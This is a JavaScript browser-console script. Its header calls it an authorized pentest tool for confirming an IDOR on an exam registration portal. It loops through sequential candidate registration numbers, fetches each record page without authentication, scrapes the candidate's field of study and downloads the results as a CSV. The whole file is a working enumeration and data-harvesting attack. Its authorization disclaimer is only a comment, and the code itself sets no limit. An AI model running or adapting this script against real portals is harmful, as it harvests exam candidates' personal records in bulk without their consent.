/**
 * verify-matricules-filieres.js
 *
 * Authorized security-testing utility: bulk-checks a range of exam
 * registration numbers (matricules) against a registration portal to
 * confirm whether an IDOR (Insecure Direct Object Reference) exposes
 * candidate records — including "filière" (field of study) — to any
 * unauthenticated visitor who can guess a sequential ID.
 *
 * Usage: run in the browser DevTools console while on the target
 * origin, inside the scope of an authorized penetration test / bug
 * bounty engagement only. Do not run against systems you do not have
 * explicit written authorization to test.
 *
 * Adjust `debut`, `fin`, and the matricule prefix/format below to match
 * the engagement's agreed test range.
 */
(async () => {
    const debut = 1;
    const fin = 150;
    const resultat = [];

    console.log("🔎 Vérification des matricules...");

    for (let i = debut; i <= fin; i++) {
        const matricule = `26SP${String(i).padStart(5, "0")}`;
        const url = `/registration-display-submit/SP/${matricule}`;

        try {
            const response = await fetch(url);
            const html = await response.text();

            const existe =
                response.ok &&
                html.includes(matricule) &&
                html.includes("Inscription au concours");

            let filiere = "";

            if (existe) {
                const doc = new DOMParser().parseFromString(html, "text/html");

                // Recherche des champs susceptibles de contenir la filière
                const elements = [...doc.querySelectorAll("input, select, textarea, td, th, label, p, span, div")];

                for (const element of elements) {
                    const texte = element.textContent.trim();

                    if (
                        /filière|filiere|spécialité|specialite|formation/i.test(texte)
                    ) {
                        const valeur =
                            element.value ||
                            element.nextElementSibling?.textContent?.trim() ||
                            texte;

                        if (valeur && valeur.length > 5) {
                            filiere = valeur.replace(/\s+/g, " ").trim();
                            break;
                        }
                    }
                }
            }

            resultat.push({
                Matricule: matricule,
                Existe: existe ? "OUI" : "NON",
                Filiere: filiere,
                Lien: existe
                    ? new URL(url, window.location.origin).href
                    : ""
            });

            console.log(
                `${i}/150 — ${matricule} → ${existe ? "✅" : "❌"} ${filiere}`
            );

        } catch (erreur) {
            resultat.push({
                Matricule: matricule,
                Existe: "ERREUR",
                Filiere: "",
                Lien: ""
            });

            console.log(`${i}/150 — ${matricule} → ⚠️ ERREUR`);
        }

        await new Promise(resolve => setTimeout(resolve, 150));
    }

    // Export CSV compatible Excel
    const lignes = [
        ["Matricule", "Existe", "Filière concourue", "Lien"],
        ...resultat.map(x => [
            x.Matricule,
            x.Existe,
            x.Filiere,
            x.Lien
        ])
    ];

    const csv = "﻿" + lignes
        .map(ligne =>
            ligne.map(cellule =>
                `"${String(cellule).replace(/"/g, '""')}"`
            ).join(";")
        )
        .join("\n");

    const blob = new Blob([csv], {
        type: "text/csv;charset=utf-8;"
    });

    const lien = document.createElement("a");
    lien.href = URL.createObjectURL(blob);
    lien.download = "matricules_26SP00001_a_26SP00150.csv";

    document.body.appendChild(lien);
    lien.click();
    lien.remove();

    console.log("================================");
    console.log("✅ TERMINÉ");
    console.log(`📊 ${resultat.length} matricules vérifiés`);
    console.log("📁 Fichier CSV téléchargé");
    console.log("================================");

    console.table(resultat);
})();
